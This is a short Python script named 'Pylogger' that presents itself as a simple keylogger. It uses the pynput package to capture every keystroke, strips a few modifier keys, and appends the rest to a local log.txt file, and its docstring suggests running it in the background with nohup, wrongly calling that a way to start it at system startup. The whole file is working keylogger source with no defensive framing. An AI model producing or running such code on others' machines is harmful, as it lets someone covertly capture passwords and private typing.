"""
    Pylogger
    A simple keylogger script made using pynput package in python.

    To run this script at the system startup (Linux) automatically, open your terminal and type the following
    command:
        nohup python path/to/your/script.pyw &

"""

from pynput.keyboard import Listener


def on_press(key):
    keystroke = str(key)
    keystroke = keystroke.replace("'", "")

    if keystroke == 'Key.space':
        keystroke = ' '
    if keystroke == 'Key.enter':
        keystroke = '\n'
    if keystroke == 'Key.tab':
        keystroke = '\t'

    redundant = ['Key.shift', 'Key.ctrl', 'Key.shift_r', 'Key.shift_l', 'Key.ctrl_r', 'Key.ctrl_l',
                 'Key.backspace']

    if keystroke in redundant:
        keystroke = ''

    with open('log.txt', 'a') as f:
        f.write(keystroke)


with Listener(on_press=on_press) as listener:
    listener.join()
